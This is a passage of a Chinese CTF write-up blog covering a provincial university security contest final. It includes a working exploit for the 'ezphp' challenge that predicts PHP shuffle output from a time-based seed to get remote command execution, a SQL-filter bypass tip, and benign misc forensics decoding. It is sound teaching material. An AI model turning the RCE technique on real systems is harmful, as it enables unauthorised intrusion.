class="hljs-built_in">chr</span>(<span class="hljs-number">105</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">112</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">32</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">102</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">108</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>)]))<br></code></pre></td></tr></table></figure>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-8.png"></p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">密码为hehehe233_Igotroot<br></code></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>大部分做的都是签到题，还有很多不会的地方，总之，学无止尽，继续学习吧</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>浙江</tag>
      </tags>
  </entry>
  <entry>
    <title>第五届浙江省大学生网络与信息安全竞赛决赛-WP</title>
    <url>/%E7%AB%9E%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-wp.html</url>
    <content><![CDATA[<p>二战浙江省赛，混了个二等奖。感觉预赛题目都比决赛题目出的好</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">10000</span>;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&quot;Ctfer&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">shuffle</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$a</span>[<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]](<span class="hljs-variable">$a</span>[<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]]);<br></code></pre></td></tr></table></figure>

<p>因为<code>shuffle</code>函数使用伪随机数产生器，所以当时间戳相同时，两个相同数组打乱后产生的两个新数组也相同</p>
<p>在本地编写php代码，获取索引值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">10000</span>;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&quot;Ctfer&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">shuffle</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">10003</span>;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-string">&#x27;system&#x27;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-string">&#x27;system:&#x27;</span>.<span class="hljs-variable">$i</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])&#123;<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-string">&#x27;cmd:&#x27;</span>.<span class="hljs-variable">$i</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>将本地获取到的索引值传入靶机，成功rce</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    cmd=raw_input(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&#x27;%20&#x27;</span>);<br>    t=<span class="hljs-built_in">int</span>(time.time())<br>    d=requests.get(<span class="hljs-string">&#x27;http://172.29.17.232/index.php?a=%s&amp;cmd=%s&#x27;</span>%(<span class="hljs-built_in">int</span>(t),cmd)).text<br><br>    system=<span class="hljs-built_in">int</span>(re.findall(<span class="hljs-string">&#x27;system:(\d+)&#x27;</span>,d)[<span class="hljs-number">0</span>])<br>    c=<span class="hljs-built_in">int</span>(re.findall(<span class="hljs-string">&#x27;cmd:(\d+)&#x27;</span>,d)[<span class="hljs-number">0</span>])<br><br>    d=requests.get(<span class="hljs-string">&#x27;http://80.endpoint-d9deec0835844de5831e550ffe384d16.dasc.buuoj.cn:81/?cmd=%s&amp;c=%s&amp;b=%s&#x27;</span>%(cmd,c,system))<br>    <span class="hljs-built_in">print</span>(d.text.split(<span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>)[<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>


<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-ezphp-1.png"></p>
<h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p>过滤了空格，用<code>/**/</code>代替</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-babysql-1.png"></p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="checkin-gift"><a href="#checkin-gift" class="headerlink" title="checkin_gift"></a>checkin_gift</h2><p>两张图片中间拿到<code>Gift from glzjin: FIWOIxqEZyIWJwIHG01ZDxqMZ1EUGycHGHHlERqnDyAUDyERHH9PI0qOZ0EWGIcEGIxlESSAGREAHGWUF05RAD== Have a nice time, Bye!</code></p>
<p>先凯撒位移13位</p>
<p><code>SVJBVkdRMlVJWjVUT01MQkdZM1RHTlpUTUUyREdaQlNHQlREUU9CV0dBM0RJTVpRTVkyRFFNTERNUTJHS05ENQ==</code></p>
<p>base64</p>
<p><code>IRAVGQ2UIZ5TOMLBGY3TGNZTME2DGZBSGBTDQOBWGA3DIMZQMY2DQMLDMQ2GKND5</code></p>
<p>base32</p>
<p><code>DASCTF&#123;71a67373a43d20f88606430f481cd4e4&#125;</code></p>
<h2 id="m4a"><a href="#m4a" class="headerlink" title="m4a"></a>m4a</h2><p>在文件结尾发现一个被反转的压缩包，提取出来一个带密码的压缩包</p>
<p>添加后缀<code>mp4</code>发现存在摩斯</p>
<p><code>-... .- ....- ...-- -... -.-. . ..-. -.-. ..--- ----- ....-</code></p>
<p>得到压缩包密码<code>BA43BCEFC204</code></p>
<p>解压得到<br><code>(+w)v&amp;LdG_FhgKhdFfhgahJfKcgcKdc_eeIJ_gFN</code></p>
<p>rot47</p>
<p><code>WZHXGU&#123;5v0u98z95u79829y7z484z54066xy08u&#125;</code></p>
<p>atbash</p>
<p><code>dasctf&#123;5e0f98a95f79829b7a484a54066cb08f&#125;</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-m4a-1.png"></p>
<h2 id="Unkn0wnData"><a href="#Unkn0wnData" class="headerlink" title="Unkn0wnData"></a>Unkn0wnData</h2><p><em>赛后复现</em></p>
<p>附件结尾存在一串base64字符串</p>
<p><code>V2hlcmUxc0tleT8KCu2gve25g+2gve2yte2gvO28v+2gvO2+pO2gve26qu2gvO28j+2gve2wju2gvu21i+2gve26q+2gve24huKche2gvO29je2gvO2+pO2gve2wmO2gvO28j+KEueKMqO2gve24je2gvO2+iOKcie2gvu20o+2gve27qe2gvO29jO2gve26qu2gvO29tOKEueKYuu2gve26ueKdk+2gvO29tO2gve20rO2gvO28qu2gvO29te2gve2xo+2gve20hOKYg+2gve2xjO2gve24ju2gve2xjO2gve20hO2gve2xjO2gve20qu2gvO29jO2gve2xge2gvO29je2gvO29jO2gvO28j+2gvO2+g+2gve26sO2gvO29te2gve2wje2gvO2+heKche2gvO29je2gvu22k+2gve24ju2gve24iu2gvu20o+2gvO2/ue2gvO29je2gve2yp+2gve20hO2gve20hO2gvu20o+2gve2xge2gvu21i+2gve26q+KYuu2gvO29tO2gve24ge2gve26q+2gve24h+2gve26sOKPqe2gve24je2gvO28v+2gve2yte2gvu22k+2gve24h+2gve27qeKclu2gve21ue2gve2wju2gve2zgu2gve2zgu2gve2yp+2gve23ku2gve23kg==</code></p>
<p>解密后用<code>UTF-8</code>编码显示</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-Unkn0wnData-1.png"></p>
<p>stegsolve分析图片，0通道中发现一个压缩包</p>
<p>解压得到key.txt</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">data:<br>0000100000000000<br>00000c0000000000<br>00000e0000000000<br>00002a0000000000<br>0000100000000000<br>0000040000000000<br>0000080000000000<br>00002a0000000000<br>0000160000000000<br>00000b0000000000<br>00000c0000000000<br>00001c0000000000<br>00002a0000000000<br>00002c0000000000<br>0200340000000000<br>00002a0000000000<br>0200090000000000<br>00000c0000000000<br>0000110000000000<br>0000070000000000<br>0200170000000000<br>00002a0000000000<br>0200170000000000<br>00000b0000000000<br>0000080000000000<br>0000120000000000<br>00002a0000000000<br>0200150000000000<br>0000080000000000<br>0000040000000000<br>00000f0000000000<br>00000a0000000000<br>00002a0000000000<br>02000e0000000000<br>0000080000000000<br>00001c0000000000<br>00000a0000000000<br>00002a0000000000<br>0000040000000000<br>0000110000000000<br>0000070000000000<br>00000f0000000000<br>00002a0000000000<br>0200100000000000<br>0000040000000000<br>00000e0000000000<br>0000080000000000<br>0000080000000000<br>00002a0000000000<br>02000c0000000000<br>0000170000000000<br>02001e0000000000<br>0000070000000000<br>00002a0000000000<br></code></pre></td></tr></table></figure>

<p>明显的USB键盘流量</p>
<p>使用脚本提取出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><br>DataFileName = <span class="hljs-string">&quot;usb.dat&quot;</span><br><br>presses = []<br><br>normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># read data</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key.txt&#x27;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            presses.append(line[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>])<br>    <span class="hljs-comment"># handle</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> press <span class="hljs-keyword">in</span> presses:<br>        <span class="hljs-keyword">if</span> press == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-keyword">in</span> press:<br>            Bytes = press.split(<span class="hljs-string">&quot;:&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            Bytes = [press[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(press), <span class="hljs-number">2</span>)]<br>        <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;00&quot;</span>:<br>            <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">2</span>] != <span class="hljs-string">&quot;00&quot;</span> <span class="hljs-keyword">and</span> normalKeys.get(Bytes[<span class="hljs-number">2</span>]):<br>                result += normalKeys[Bytes[<span class="hljs-number">2</span>]]<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">int</span>(Bytes[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0b10</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>(Bytes[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0b100000</span>: <span class="hljs-comment"># shift key is pressed.</span><br>            <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">2</span>] != <span class="hljs-string">&quot;00&quot;</span> <span class="hljs-keyword">and</span> normalKeys.get(Bytes[<span class="hljs-number">2</span>]):<br>                result += shiftKeys[Bytes[<span class="hljs-number">2</span>]]<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Unknow Key : %s&quot;</span> % (Bytes[<span class="hljs-number">0</span>]))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Found : %s&quot;</span> % (result))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>

<p>得到<code>mik&lt;DEL&gt;mae&lt;DEL&gt;shiy&lt;DEL&gt;&lt;SPACE&gt;:&lt;DEL&gt;FindT&lt;DEL&gt;Theo&lt;DEL&gt;Realg&lt;DEL&gt;Keyg&lt;DEL&gt;andl&lt;DEL&gt;Makee&lt;DEL&gt;It!d&lt;DEL&gt;</code></p>
<p>去掉删除的字符应该是<code>mimashi FindTheRealKeyandMakeIt!</code>，但是这句话的意思让我们找到真正的key，所以这个应该是假的key</p>
<p>仔细观察删掉的字符，发现正好是key开头，提取出来得到<code>key:Toggled</code></p>
<p>emoji-aes解密得到flag</p>
<h2 id="hard-Digital-plate"><a href="#hard-Digital-plate" class="headerlink" title="hard_Digital_plate"></a>hard_Digital_plate</h2><p><em>赛后复现</em></p>
<p><code>foremost</code>可以分离出一张图片，根据名字猜测是<code>oursecret</code>隐写</p>
<p>流量分析，发现是数位板流量</p>
<p>tshark提取<br><code>tshark -r hard_Digital_plate.pcapng -T fields -e usbhid.data | sed &#39;/^\s*$/d&#39; &gt; out.txt</code></p>
<p>python提取坐标</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>result = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(line[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>], <span class="hljs-number">16</span>) == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">continue</span><br>    x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>], 